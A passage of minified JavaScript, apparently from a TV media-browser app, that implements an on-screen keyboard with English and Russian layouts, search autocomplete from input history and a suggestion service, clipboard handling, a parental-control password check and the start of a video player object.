["ENG"],["_ST_enter.png"]]],handler:function(key){var c=this;switch(key){case VK_0:VK.enter(0);break;case VK_1:VK.enter(1);break;case VK_2:VK.enter(2);break;case VK_3:VK.enter(3);break;case VK_4:VK.enter(4);break;case VK_5:VK.enter(5);break;case VK_6:VK.enter(6);break;case VK_7:VK.enter(7);break;case VK_8:VK.enter(8);break;case VK_9:VK.enter(9);break;case VK_DOWN:if(VK.pos[0]==4||VK.qSelect>-1||maJor.params.get("keyboard")=="system"){if(c.quicks.length>0){VK.qSelect++;c.quickList();if(VK.qSelect==c.quicks.length-1&&VK.pos[0]==4)VK.pos[0]++}else VK.pos[0]++}else VK.pos[0]++;VK.setpos(1);break;case VK_UP:if(VK.pos[0]==0||VK.qSelect>-1||maJor.params.get("keyboard")=="system"){if(c.quicks.length>0){VK.qSelect--;c.quickList();if(VK.qSelect==-1&&VK.pos[0]==0)VK.pos[0]--}else VK.pos[0]--}else VK.pos[0]--;VK.setpos(1);break;case VK_FAST_FWD:VK.enter("_ST_right.png");break;case VK_REWIND:VK.enter("_ST_left.png");break;case VK_LEFT:VK.pos[1]--;VK.setpos();break;case VK_RIGHT:VK.pos[1]++;VK.setpos();break;case VK_ENTER:if(VK.qSelect==-1){var qk=VK.Keyboard[VK.pos[0]][VK.pos[1]];var key=qk[VK.shift]||qk[0];VK.enter(key)}else{VK.enter("Enter");c.quickList(-1);VK.pos[0]=4;VK.pos[1]=7;VK.setpos()}
break;case VK_G:case VK_GREEN:case 35:VK.enter("_ST_international.png");break;case VK_BLUE:VK.enter("_ST_enter.png");break;case 46:case VK_YELLOW:c.clearQuick();break;case VK_RED:VK.enter("_ST_backspace.png");break;case VK_BACK:case 220:c.close();break;default:if((key>=65&&key<=90)||(key>=186&&key<=222)||key==32||key==8||key==46){var s="";if(key==46){VK.enter("_ST_backspace.png");return}
if(key==186)s=";";if(key==187)s="=";if(key==188)s=",";if(key==189)s="-";if(key==190)s=".";if(key==191)s="/";if(key==192)s="`";if(key==219)s="[";if(key==220)s="\\";if(key==221)s="]";if(key==222)s="'";if(VK.Keyboard[1][0][0]=="q"){if(s=="")s=String.fromCharCode(key).toLowerCase()}else{var from="qwertyuiop[]asdfghjkl;'zxcvbnm,./".split("");var dest="йцукенгшщзхъфывапролджэячсмитьбю.".split("");if(s=="")s=String.fromCharCode(key).toLowerCase();s=replaceArray(s,from,dest)}}
break}},render:function(){if($_("keyboard")){var html='';for(i in VK.Keyboard){for(j in VK.Keyboard[i]){if(VK.Keyboard[i][j].length==1)var vshift=0;else vshift=VK.shift;var but=VK.Keyboard[i][j][vshift],svg="";if(but.indexOf("_ST_")==0)var pbut="<img src='"+_img(but)+"'>";else pbut=but;var cl="",vstyl="";if(but=="http://"||but=="https://")vstyl='font-size:14px;';else if(but.indexOf("international.png")>0){cl="green";svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M480-80q-82 0-155-31.5t-127.5-86Q143-252 111.5-325T80-480q0-83 31.5-155.5t86-127Q252-817 325-848.5T480-880q83 0 155.5 31.5t127 86q54.5 54.5 86 127T880-480q0 82-31.5 155t-86 127.5q-54.5 54.5-127 86T480-80Zm0-82q26-36 45-75t31-83H404q12 44 31 83t45 75Zm-104-16q-18-33-31.5-68.5T322-320H204q29 50 72.5 87t99.5 55Zm208 0q56-18 99.5-55t72.5-87H638q-9 38-22.5 73.5T584-178ZM170-400h136q-3-20-4.5-39.5T300-480q0-21 1.5-40.5T306-560H170q-5 20-7.5 39.5T160-480q0 21 2.5 40.5T170-400Zm216 0h188q3-20 4.5-39.5T580-480q0-21-1.5-40.5T574-560H386q-3 20-4.5 39.5T380-480q0 21 1.5 40.5T386-400Zm268 0h136q5-20 7.5-39.5T800-480q0-21-2.5-40.5T790-560H654q3 20 4.5 39.5T660-480q0 21-1.5 40.5T654-400Zm-16-240h118q-29-50-72.5-87T584-782q18 33 31.5 68.5T638-640Zm-234 0h152q-12-44-31-83t-45-75q-26 36-45 75t-31 83Zm-200 0h118q9-38 22.5-73.5T376-782q-56 18-99.5 55T204-640Z"/></svg>'}else if(but.indexOf("backspace.png")>0){cl="#ce0d0d";svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="m456-320 104-104 104 104 56-56-104-104 104-104-56-56-104 104-104-104-56 56 104 104-104 104 56 56Zm-96 160q-19 0-36-8.5T296-192L80-480l216-288q11-15 28-23.5t36-8.5h440q33 0 56.5 23.5T880-720v480q0 33-23.5 56.5T800-160H360ZM180-480l180 240h440v-480H360L180-480Zm400 0Z"/></svg>'}else if(but.indexOf("enter.png")>0){cl="#115bca";vstyl='width:92px;';svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-send-horizontal-icon lucide-send-horizontal"><path d="M3.714 3.048a.498.498 0 0 0-.683.627l2.843 7.627a2 2 0 0 1 0 1.396l-2.842 7.627a.498.498 0 0 0 .682.627l18-8.5a.5.5 0 0 0 0-.904z"/><path d="M6 12h16"/></svg>';svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check-icon lucide-check"><path d="M20 6 9 17l-5-5"/></svg>'}else if(but.indexOf("clear.png")>0){cl="#e9d737";svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-eraser-icon lucide-eraser"><path d="M21 21H8a2 2 0 0 1-1.42-.587l-3.994-3.999a2 2 0 0 1 0-2.828l10-10a2 2 0 0 1 2.829 0l5.999 6a2 2 0 0 1 0 2.828L12.834 21"/><path d="m5.082 11.09 8.828 8.828"/></svg>'}else if(but.indexOf("space.png")>0){vstyl='width:180px;';svg="<svg  height='28px' width='28px' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path d='M0 0h24v24H0z' fill='none'/><path fill='currentColor' d='M18 9v4H6V9H4v6h16V9h-2z'/></svg>"}else if(but.indexOf("return.png")>0){svg='<svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-undo2-icon lucide-undo-2"><path d="M9 14 4 9l5-5"/><path d="M4 9h10.5a5.5 5.5 0 0 1 5.5 5.5a5.5 5.5 0 0 1-5.5 5.5H11"/></svg>'}else if(but.indexOf("shift.png")>0){svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-big-up-icon lucide-arrow-big-up"><path d="M9 13a1 1 0 0 0-1-1H5.061a1 1 0 0 1-.75-1.811l6.836-6.835a1.207 1.207 0 0 1 1.707 0l6.835 6.835a1 1 0 0 1-.75 1.811H16a1 1 0 0 0-1 1v6a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1z"/></svg>'}else if(but.indexOf("copy.png")>0){svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>'}else if(but.indexOf("paste.png")>0){svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clipboard-icon lucide-clipboard"><rect width="8" height="4" x="8" y="2" rx="1" ry="1"/><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/></svg>'}else if(but.indexOf("left.png")>0){svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-left-icon lucide-chevron-left"><path d="m15 18-6-6 6-6"/></svg>'}else if(but.indexOf("right.png")>0){svg='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-right-icon lucide-chevron-right"><path d="m9 18 6-6-6-6"/></svg>'}else if(but=="ENG"){cl="green";vstyl='font-size:16px;'}
if(svg&&maJor.supports.svg)pbut=svg;if(cl)pbut="<span style='position:absolute;right: 2px;bottom: 4px;width: 7px;height: 7px;border-radius:2px;background:"+cl+";'></span>"+pbut;if(i==4||svg)vstyl+="background-color: #263349;";if(vstyl)vstyl=' style="'+vstyl+'"';html+="<div class='vokey'"+vstyl+">";function escapeForHTMLAttr(str){return str.replace(/\\/g,"\\\\").replace(/'/g,"\\'").replace(/"/g,"&quot;")}
html+="<div onmousemove=\"VK.set(["+i+","+j+",-1]);\" "+"onclick=\"VK.enter('"+escapeForHTMLAttr(but)+"');\" id='kb"+i+""+j+"' class='vkey'>"+pbut+"</div>";html+="</div>"}
html+="<br clear='both' />"}
$_("keyboard","<div style='display: inline-block;'>"+html+"</div>");VK.setpos()}},arLast:function(str){var c=this;var s=[];maJor.each(maJor.enteresObj,function(v,k){if(str==c.pq.el.value&&gV(c.pq.el,"type")=="ip")var allip=1;else var allip=0;if(String(v.n).indexOf(str)==0||allip){if(!c.typepresearch||String(v.n).indexOf(c.typepresearch)!=-1){var isip=String(v.t).match(/torrserve|remote|acestream|ip/);if(str==""&&isip&&!gV(c.pq.el,"type").match(/torrserve|remote|acestream|ip/)&&!allip)return;s.push({"q":v.n,"type":"last","img":"_ST_history.png","id":k,"source":(isip?v.t:"История")})}}
if(str==""&&s.length>10&&c.presearch)return});if(str!=""&&c.presearch){for(var i in lO01II111Irn0OI1IlYpr){if(String(lO01II111Irn0OI1IlYpr[i].title).indexOf(str)==0){s.push({"q":lO01II111Irn0OI1IlYpr[i].title,"xml_url":lO01II111Irn0OI1IlYpr[i].xml_url,"type":"history","img":lO01II111Irn0OI1IlYpr[i].icon,"source":"История"})}}}
return s},clearQuick:function(){var c=this;if(c.getvalue()!==""&&c.qSelect==-1)c.setvalue("");else if(c.qSelect==-1)c.delQuick("page");else c.delQuick(gV(c.quicks[c.qSelect],"id"));c.quickGet(c.getvalue())},delQuick:function(id){var c=this;if(id=="page"){var nx=0;for(var i in c.quicks){if(gV(c.quicks[i],"id")!=""){maJor.enteresObj.splice(c.quicks[i].id-nx,1);nx++;break}}
kjtYpr.inf("Удалено "+nx+" значений с истории вводов",1500)}else if(id!=""){maJor.enteresObj.splice(id,1);kjtYpr.inf("Удалено 1 элемент с истории вводов",1500)}else kjtYpr.inf("Удалить можно только значение с вашей истории вводов!",1500);maJor.write("enteres",l1OOl0I0IASY10lQ10Ypr(maJor.enteresObj))},quickList:function(n){var c=this;if($_("presearch")){if(n!=null)c.qSelect=n;if(c.qSelect<-1)c.qSelect=c.quicks.length-1;if(c.qSelect>c.quicks.length-1)c.qSelect=-1;if(c.qSelect==-1){$_("presearch").style.borderColor="transparent";$_(c.id).style.border="2px solid #65D0E4"}else{$_("presearch").style.borderColor="#65D0E4";$_(c.id).style.border="2px solid transparent"}
for(var i=0;i<c.quicks.length;i++){if($_("l01Il0Ilu0D101OIYpr"+i)){$_("l01Il0Ilu0D101OIYpr"+i).style.backgroundColor=((gV(c.quicks[i],"type")=="se"&&(c.qSelect==-1||c.qSelect==i))?"#465057":"");$_("l01Il0Ilu0D101OIYpr"+i).style.color=(i==c.qSelect?"orange":"")}}}},quickParse:function(list,data,sourc){maJor.each(data,function(w){if(w.q){w.source=(w.source||sourc);w.type=(w.type||"text");list.push(w)}else if(typeof w=="string")list.push({"q":gV(w),"type":"text","source":sourc})});return list},quickRender:function(list,reqid,load){var c=this,max=16;if(reqid==c.req_id){c.quicks=[];$_("presearch","");$_("MenuCh","");var l01Il0Ilu0D101OIYpr="",ex=";",qtypes={};if(c.str==""&&window._){list=_.filter(list,function(v){return!is_xxx(gV(v,"q"))})}
if(_.size(list)>max){maJor.each(list,function(w){if(qtypes[w.type])qtypes[w.type]++;else qtypes[w.type]=1});var r=_.size(list)-max;var rr=Math.floor(r/_.size(qtypes))
var razn=r-rr*_.size(qtypes);var nd=0;var last;maJor.each(_(qtypes).chain().pairs().sortBy(_.last).value(),function(w){last=w[0];qtypes[last]-=rr-nd;nd=0;if(qtypes[last]<1){qtypes[last]=1;nd=1}});qtypes[last]-=razn}
nd=0;maJor.each(list,function(w){if(w.q){w.q=w.q.replace(/<.*?>/g,"");if(ex.indexOf(";"+w.q+gV(w,"xml_url")+";")==-1){if(qtypes[w.type]){if(qtypes[w.type]){qtypes[w.type]--}else if(nd)nd--;else return}
if(c.quicks.length<max){l01Il0Ilu0D101OIYpr+="<div id='l01Il0Ilu0D101OIYpr"+c.quicks.length+"' class='qsearch' onclick=\"VK.enter('Enter');\" onmousemove=\"VK.quickList("+c.quicks.length+");\" onclick=\"VK.enter('Enter');\">";if(gV(w,"img")!="")l01Il0Ilu0D101OIYpr+='<img onerror="onImgError(this)" src="'+_img(w.img)+'">';if(gV(w,"source"))l01Il0Ilu0D101OIYpr+="<div class='qsource'>"+gV(w,"source")+"</div>";l01Il0Ilu0D101OIYpr+="<div class='qstext'>"+w.q;l01Il0Ilu0D101OIYpr+="</div></div>";ex+=w.q+gV(w,"xml_url")+";";c.quicks.push(w)}}else nd++}});if(load&&c.quicks.length<12)l01Il0Ilu0D101OIYpr+="<div style=''><center><img src='"+_img("_ST_b_loading.gif")+"' width=25 /></center></div>";$_("presearch","<div onmouseout=\"VK.quickList(-1);\" id='PreSearch' style='border:2px solid transparent;padding:0px 3px;'>"+l01Il0Ilu0D101OIYpr+"</div>");c.quickList()}},quickGet:function(str){var c=this;try{var load=0;c.str=str=parseHtmlEnteties(str||"");c.req_id++;var reqid=c.req_id;$_(c.id).scrollLeft=$_(VK.id).scrollWidth;VK.qSelect=-1;var list=c.arLast(str);if(c.presearch){var u=sU(c.presearch,"client=3&presearch="+str);if(str=="")var sso="Топ запросов";else sso="";if(gV(c.pq.el,"playlist_url")=="searchEngines"){if($_("icoedit")==null)$_("icosearch",'<img id="icoedit" align="left" onerror="onImgError(this,\'ico_edit\');" src="'+_img(getDefaultSE()["logo"])+'" >');if(str!=""){var xd=getDefaultSE();if(str.match(/^(http|www\.|html:\/\/)/)){list.unshift({"q":str,"type":"se","img":_img("_ST_urls.png"),"source":' - _FPOpen link_'});$_("icosearch",'<img id="icoedit" align="left" onerror="onImgError(this,\'ico_edit\');" src="'+_img("_ST_urls.png")+'" >')}else list.unshift({"q":str,"type":"se","img":_img(xd.logo),"source":' - '+"_FPSearch_ _FPin_ "+xd.title})}}else if($_("icoedit")==null)$_("icosearch",'<img id="icoedit" align="left" onerror="this.src=\''+ico_edit+'\';" src="'+curCh("logo_30x30")+'" >');if(!c.hS[u]){load=1;uHelper.create("directnoheader").getI(u).parse=function(s){maJor.statusbar();try{data=lIlI1VBOOlI01QYpr(gV(s));if(data!=null){c.hS[u]=data;list=c.quickParse(list,c.hS[u],sso)}
c.quickRender(list,reqid)}catch(e){kjtYpr.popUp('Err quick format [{q:"text"},...]<br>'+e.message,2500)}}}else list=c.quickParse(list,c.hS[u],sso)}
c.quickRender(list,reqid,load)}catch(e){kjtYpr.popUp("Err quick data "+e.message,1200)}},addSystem:function(){var c=this;c.focus.focus();VK.focus.addEventListener("keydown",function(event){var key=event.keyCode||event.keycode||event.which;if(key==VK_LEFT||key==VK_RIGHT){if(VK.qSelect!=-1)c.complete(c.getvalue())}else if(key==VK_BACK||key==27||(key==8&&c.getvalue()==="")){setTimeout("VK.close(1);	",100)}else if(key==VK_DOWN||key==VK_UP){event.preventDefault();if(key==VK_DOWN)c.qSelect++;else c.qSelect--;c.quickList()}else if(key===13){if(maJor.build>=7||1){event.preventDefault();setTimeout(function(){c.complete(c.getvalue())},150)}}});c.focus.oninput=function(){if(1){if(VK.qSelect!=-1)c.complete(c.getvalue());c.quickList(-1);c.quickGet(c.getvalue())}}},open:function(pq){try{var c=this;c.quicks=[];if(!pq.el)pq.el=curCh();c.select=getSelect();c.pq=pq;c.type=c.pq.type||gV(c.pq.el,"type")||"";c.title=c.pq.title||gV(c.pq.el,"title")||"";c.typepresearch=c.pq.typepresearch||gV(c.pq.el,"typepresearch")||"";c.search_on=c.pq.search_on||gV(c.pq.el,"search_on");if(c.search_on=="search_on"||c.search_on=="")c.search_on="_FPVvediteText_";c.inputId=c.pq.inputId||gV(c.pq.el,"inputId")||"";if(gV(c.pq.el,"presearch").indexOf("http")!=0){if(typeof c.pq.el.search=="object"||c.title.match(/(ошук|arch|оиск|poisk|искат|find|найти|)/i))
c.pq.el.presearch="http://spider.appfxml.com/omnibox/?type=auto"}
if(gV(c.pq.el,"presearch").indexOf("http")==0)c.presearch=gV(c.pq.el,"presearch");else c.presearch=null;if(c.Keyboard==null){if(gV(c.pq.el,"playlist_url")=="cmdEnterlist")c.Keyboard=VK.US;else c.Keyboard=c.Kir}
var gtitle="";if(c.type!="omnibox"){if($_("ch"+c.select)&&!gV(c.pq.el,"from_aside"))$_("ch"+c.select).style.visibility="hidden";gtitle="<div style='margin-left: 5px;margin-bottom: 3px;font-size: 20px;white-space: nowrap;text-overflow: ellipsis;overflow: hidden;'>"+c.search_on+"</div>";var pholder=(c.title!=""?" "+(c.pq.el.search_title||c.title).replace(/<.*?>/g,"")+"":"Введите текст")}else pholder="Введите поисковый запрос или ссылку";var html='<div style="font-size:22px;width:100%;text-align: left;overflow:hidden;zoom:'+maJor.params.get("zoom")+'%;">'+gtitle+'<div style="border-radius: 10px;margin: 0px; background-color: #eeeeee;width:auto;text-align: left;">'+'<span id="icosearch" style="display: flex;align-items: center;justify-content: center;float:right;height:38px;width:38px;"></span><div style="overflow: hidden;">';if(maJor.params.get("keyboard")=="system")html+='<form onsubmit="VK.onkeyb(this); return false;"><input id="search" type="text" style="height:32px;padding: 0px;width: 98%; border: 2px solid rgb(101, 208, 228);font-size: 25px;"></form>';else html+='<div id="search" style="border-radius: 10px;font-family: Arial, Helvetica, sans-serif;overflow: hidden;white-space: nowrap;color: black;height:32px;padding-top: 3px;width: 98%; border: 2px solid rgb(101, 208, 228);font-size: 24px;" onclick="VK.setSelectAll(0);"><span id="textsearch"></span><span id="canim" style="color: #5e5e5e;display:none;animation: blink 0.7s infinite;font-size: 24px;">|</span> <span id="placeholder" style="font-size: 16px;vertical-align: middle;color: gray; pointer-events: none;">'+pholder+'</span></div>';c.pheight=Math.ceil(((100/maJor.params.get("zoom"))*0.95*0.65*(maJor.screen().h))-95);html+='</div></div><div id="presearch" style="height:'+c.pheight+'px;overflow:hidden;"></div> </div>';if(maJor.params.get("keyboard")!="system")html+='<div id="keyboard" style="position:absolute;height: 228px;bottom: 10px;width: 100%; "></div>';$_("vk",html);$_("vk").style.display="block";c.id="search";c.focus=$_(c.id);c.setvalue(c.pq.value||gV(c.pq.el,"value"));handler="vk";if(c.type=="password"){c.presearch=null;c.focus.type=c.type}
c.quickGet(gV(c.pq.el,"value"));if(maJor.params.get("keyboard")=="system")c.addSystem();else{c.render();c.setSelectAll(1);c.setCaretPosition()}
if(gP())gP().aside_close()}catch(e){kjtYpr.popUp("Err keyboard "+e.message)}},onkeyb:function(t){if(maJor.params.get("keyboard")=="system")setTimeout("VK.complete(VK.getvalue())",150)},insert:function(word){var c=this;var val=c.getvalue();if(c.isSelAll)c.setvalue(word=="-rem-"?"":word);else if(typeof c.focus.selectionStart!="undefined"){var start=c.focus.selectionStart;if(start<0)start=0;else if(start>c.getvalue().length)start=c.getvalue().length;if(word=="-rem-")c.setvalue(val.substring(0,start-1)+val.substring(c.focus.selectionStart,val.length));else c.setvalue(val.substring(0,start)+word+val.substring(c.focus.selectionStart,val.length));if(word=="-rem-")c.setCaretPosition(start-1);else c.setCaretPosition(start+word.length)}else{if(word=="-rem-")c.setvalue(val.substring(0,val.length-1));else c.setvalue(val+word)}},getvalue:function(){var c=this;if(maJor.params.get("keyboard")=="system")return String(VK.focus.value);else{if(!$_("textsearch"))return"";if(c.type=="password")return String(c.origValue);return decodeEntities($_("textsearch").innerHTML)}},setvalue:function(s){var c=this;c.origValue=s;if(maJor.params.get("keyboard")=="system")VK.focus.value=s;else{if(c.type=="password")s=s.replace(/./g,"*");$_("textsearch",s);if(c.isSelAll)c.setSelectAll(0);if(s!=="")$_("placeholder").style.display="none";else $_("placeholder").style.display="inline"}},setSelectAll:function(m){var c=this;if(c.getvalue()===""&&m)m=0;$_("textsearch").style.backgroundColor=(m?"#6fb3fb":"");c.isSelAll=m},getTextWidth:function(text,element){var style=window.getComputedStyle?window.getComputedStyle(element,null):element.currentStyle;var font=style.font||(style.fontSize+" "+style.fontFamily);var div=document.createElement('div');div.style.position='absolute';div.style.visibility='hidden';div.style.whiteSpace='nowrap';div.style.font=font;div.innerHTML=text;document.body.appendChild(div);var width=div.offsetWidth;document.body.removeChild(div);return width},setCaretPosition:function(pos,m){var c=this;if(m){if(typeof c.focus.selectionStart=="undefined")c.focus.selectionStart=c.getvalue().length;c.focus.selectionStart+=m;if(c.focus.selectionStart<0)c.focus.selectionStart=0;else if(c.focus.selectionStart>c.getvalue().length)c.focus.selectionStart=c.getvalue().length;if(c.isSelAll)c.setSelectAll(0)}else if(pos!=null)c.focus.selectionStart=pos;if(!c.isSelAll){if(!c.getvalue().length||c.focus.selectionStart==c.getvalue().length)var textWidth=0;else{var text=c.getvalue().substring(c.focus.selectionStart,c.getvalue().length);textWidth=c.getTextWidth(text,c.focus)}
$_("canim").style.display="inline";$_("canim").style.marginLeft=(-1*textWidth)+"px"}else $_("canim").style.display="none"},enter:function(str){var c=this;str=String(str);if(str.length==1){if(maJor.params.get("keyboard")=="system"){return}
c.insert(str);if(VK.shift==1){VK.shift=0;VK.render()}
c.quickGet(c.getvalue())}else{if(str.indexOf("return.png")>0)str="Close";else if(str.indexOf("clear.png")>0){c.clearQuick();return}else if(str.indexOf("copy.png")>0){VK.copy=c.getvalue();if(maJor.build>=7)text=andr.exec('{"type":"clipboard","mode":"set", "text": "'+VK.copy+'"}');else copyToClipboard(VK.id);return}else if(str.indexOf("paste.png")>0){var text="";if(maJor.build>=7)text=andr.exec('{"type":"clipboard","mode":"get"}');else if(window.clipboardData)text=window.clipboardData.getData("Text");else if(event.originalEvent&&event.originalEvent.clipboardData)text=event.originalEvent.clipboardData.getData("Text");if(text!="")VK.insert(text);else VK.insert(gV(VK.copy));return}else if(str.indexOf("left.png")>0){c.setCaretPosition(null,-1);return}else if(str.indexOf("right.png")>0){c.setCaretPosition(null,1);return}
switch(str){case "_ST_shift.png":VK.shift=(VK.shift==0)?1:0;VK.render();break;case "_ST_backspace.png":if(c.getvalue().length>0){VK.insert("-rem-")}
c.quickGet(c.getvalue());break;case "_ST_space.png":VK.insert(" ");break;case "_ST_international.png":case "ENG":if(VK.Keyboard[0][0][0]=="q")VK.Keyboard=VK.Kir;else VK.Keyboard=VK.US;VK.render();break;case "_ST_enter.png":c.complete(c.getvalue());break;case "Shift":VK.shift=(VK.shift==0)?1:0;VK.render();break;case "CLEAR":c.setvalue("")
break;case "Close":VK.close();break;case "Eng":VK.Keyboard=VK.US;VK.render();break;case "Rus":VK.Keyboard=VK.Kir;VK.render();break;case "Enter":c.complete(c.getvalue());break;default:c.insert(str);break}}
if(c.inputId=="unlockpass"){c.str=c.getvalue();if(maJor.params.get('passwordkey')==c.str){maJor.Password=c.str;c.close();Il01QllQll().navigate(c.pq.el);if(maJor.Password=="0000")kjtYpr.popUp("_FPViNeSmeniliPassRodKontrRekomendSm_</i>");else kjtYpr.popUp("<i>_FPParolDeistDk_</i>")}}},set:function(o){VK.pos=[o[0],o[1]];VK.quickList(o[2]);VK.setpos()},botleft:0,setpos:function(m){if(VK.last[0]==5){VK.pos[1]=VK.last2[1]}
if(VK.last[0]==3&&VK.pos[0]==4){if(VK.last[1]<9)VK.pos=[4,5];else if(VK.last[1]==9)VK.pos=[4,6]}
if(VK.last[0]==4&&VK.pos[0]==3&&!this.botleft){VK.pos[1]=VK.last2[1]}
if(VK.last[0]==4&&VK.pos[0]==4&&VK.pos[1]!=VK.last[1]){this.botleft=1}else this.botleft=0;if(VK.pos[0]<0)VK.pos[0]=VK.Keyboard.length-1;if(VK.pos[1]<0)VK.pos[1]=VK.Keyboard[VK.pos[0]].length-1;if(VK.pos[0]>VK.Keyboard.length-1){VK.pos[0]=0}
if(VK.pos[1]>VK.Keyboard[VK.pos[0]].length-1){if(m)VK.pos[1]=VK.Keyboard[VK.pos[0]].length-1;else VK.pos[1]=0}
for(var i in VK.Keyboard){for(var j in VK.Keyboard[i]){if(i==VK.pos[0]&&j==VK.pos[1]&&VK.qSelect==-1){$_("kb"+i+""+j).style.backgroundColor="white";$_("kb"+i+""+j).style.color="black"}else{$_("kb"+i+""+j).style.color=maJor.params.get("color");$_("kb"+i+""+j).style.background="none"}}}
VK.last2[0]=VK.last[0];VK.last2[1]=VK.last[1];VK.last[0]=VK.pos[0];VK.last[1]=VK.pos[1]},saveQuickEnteres:function(s,typ){var c=this;if(Il01QllQll("is_private")||c.type=="password"||c.type=="textarea"||gV(c,"title").match(/(пароль|password)/i))return;var md=c.pq&&md5(gV(c.pq.el,"search_on")).substr(0,10)||"";if(typ){var type=typ;md=T.timestamp}else if(s.match(/^http/))type="url";else if(c.pq&&c.pq.el&&gV(c.pq.el,"type")=="ip")type=gV(c.pq.el,"type");else if(c.presearch)type="web";else type="";var tmp=null;for(var i in maJor.enteresObj){if(maJor.enteresObj[i].n==s){tmp=maJor.enteresObj.splice(i,1)[0];if(md)tmp.s=md;if(type)tmp.t=type;maJor.enteresObj.unshift(tmp);break}}
if(tmp==null){tmp={"n":s,"s":md};if(type!="")tmp.t=type;maJor.enteresObj.unshift(tmp)}
if(maJor.enteresObj.length>300)maJor.enteresObj.splice(300,1);maJor.write("enteres",l1OOl0I0IASY10lQ10Ypr(maJor.enteresObj))},complete:function(str){var c=this;try{$_("presearch","");if(c.qSelect==-1){if(c.select>=0&&$_("ch"+c.select)){$_("ch"+c.select).style.visibility="visible";if(str!=""&&c.presearch)$_("titleid"+c.select,str)}
c.saveQuickEnteres(str);if(c.pq.oncomplete){try{if(c.pq.oncomplete(c))c.close()}catch(e){kjtYpr.popUp("Err oncomplete: "+e.message);c.close()}}else{kjtYpr.l0I0l0Ql1ZEHWI0IIYpr=str;Il01QllQll().navigate(c.pq.el,null,null,{"text":str})}}else{var q=c.quicks[c.qSelect];c.qSelect=-1;if(gV(q,"apply")){kjtYpr.l0I0l0Ql1ZEHWI0IIYpr=gV(q,"q");c.saveQuickEnteres(kjtYpr.l0I0l0Ql1ZEHWI0IIYpr);Il01QllQll().navigate(c.pq.el,null,null,{"text":kjtYpr.l0I0l0Ql1ZEHWI0IIYpr})}else if(gV(q,"type")=="se")c.complete(str);else if(gV(q,"xml_url")!=""){c.close();OpenUrl({"title":q.q,"playlist_url":q.xml_url,"logo_30x30":gV(q,"img")})}else{c.pq.el.type_quicksearch=gV(q,"type");c.setvalue(q.q);c.qSelect=-1;if(maJor.params.get("keyboard")=="system"){c.focus.blur();c.focus.focus()}else{if(c.getvalue().indexOf("http")==0&&c.Keyboard[1][0][0]!="q")c.enter("Eng");VK.pos[0]=4;VK.pos[1]=7;VK.setpos()}
if(c.presearch)c.quickGet(c.getvalue());c.quickList()}}}catch(e){kjtYpr.popUp("Err complete: "+e.message)}},close:function(m){var c=this;$_("vk").style.display="none";$_("player").style.display="none";$_("main").style.display="block";maJor.setHandler("menu");if(m==null){Il01QllQll().loadPage=null;if(getSelect()>=0&&$_("ch"+getSelect())){$_("ch"+getSelect()).style.visibility="visible";if(c.getvalue()!=="")Il01QllQll().curCh()["value"]=c.getvalue()}}
$_("vk","")}};var vPlayer={glSec:0,curTime:-1,totalTime:0,PLINDEX:-1,iptv_retry:0,lIl0II1OOluuB0IO0OYpr:0,is_arc:0,buf:2,setStart:0,lastident:"",stopped:!0,hideTimerId:null,timeoutWork:null,endTimer:null,setidprop:function(id,n){if(n==0){$_(id).style.top="0px";$_(id).style.left="0px";$_("subtitle").style.width="90%";$_("subtitle").style.top="80%";$_("subtitle").style.fontSize="40px";$_("subtitle").style.left="5%";$_(id).style.width=maJor.screen().w+"px";$_(id).style.height=maJor.screen().h+"px"}else{$_(id).style.top="63%";$_(id).style.left="67%";$_(id).style.width="32%";$_(id).style.height="37%"}},description:function(d){handler="description";$_("controlcontent").style.display="none";if($_("menu"))$_("menu").style.display="none";$_("description").style.display="none";$_("zpanel").style.display="block";$_("zpanel",(d||$_("description").innerHTML)+"<br><br><br>")},jw:{name:"jw",optScreenN:["_FPOriginal_","_FPRastyanut_","Увеличить","Auto"],optScreenV:["uniform","exactfit","fill","none"],exis:function(){return window.jwplayer},fullscreen:function(){if($_("jw").requestFullScreen)$_("jw").requestFullScreen();else if($_("jw").mozRequestFullScreen)$_("jw").mozRequestFullScreen();else if($_("jw").webkitRequestFullScreen)$_("jw").webkitRequestFullScreen();$_("jw").style.width="100%";$_("jw").style.height="100%"},pause:function(){jwplayer("jw").pause()},volume:function(x){if(x!=null)jwplayer("jw").setVolume(x);return(jwplayer("jw").getVolume()||100)},setMini:function(){var c=vPlayer;if(c.is_mini())c.setidprop("jw","mini");else 